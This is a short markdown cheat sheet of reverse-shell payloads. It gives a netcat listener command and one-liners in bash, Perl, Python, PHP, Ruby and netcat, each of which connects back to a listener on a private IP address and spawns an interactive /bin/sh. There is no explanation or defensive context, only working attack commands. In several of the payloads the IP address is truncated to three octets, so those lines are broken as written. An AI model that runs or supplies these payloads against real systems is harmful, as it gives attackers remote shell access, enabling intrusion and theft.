# Code Execution

## Attacker Listening
```cmd
nc -vv -l -p 8080
```

## Payloads
- BASH
```BASH
bash -i >& /dev/tcp/10.20.14.203/8080 0>&1
```
- PERL
```PERL
perl -e 'use Socket;$i="10.20.14";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
- Python
```Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.14",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
- PHP
```PHP
php -r '$sock=fsockopen("10.20.14",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```
- Ruby 
```Ruby
ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
- Netcat 
```cmd
nc -e /bin/sh 10.20.14 8080
```
